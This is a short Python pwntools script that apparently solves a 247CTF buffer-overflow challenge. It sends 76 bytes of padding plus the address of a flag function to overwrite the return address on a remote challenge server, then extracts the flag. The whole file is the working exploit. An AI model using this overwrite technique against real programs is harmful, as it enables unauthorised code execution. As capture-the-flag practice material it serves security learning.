
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
HOST = '0b1c6b4b1de2c797.247ctf.com'
PORT = 50101
FLAG_FUNCTION_ADDR = 0x08048576

def exploit():
    conn = remote(HOST, PORT)
    payload = b'A' * 76 + p32(FLAG_FUNCTION_ADDR)
    conn.recvuntil(b"What do you have to say?")
    conn.sendline(payload)
    response = conn.recvall().decode()
    print(response)
    if "247CTF{" in response:
        flag = re.search(r'247CTF{[^}]+}', response).group(0)
        print(f"Flag: {flag}")
    conn.close()

if __name__ == "__main__":
    try:
        exploit()
    except Exception as e:
        log.error(f"An error occurred: {e}")
```
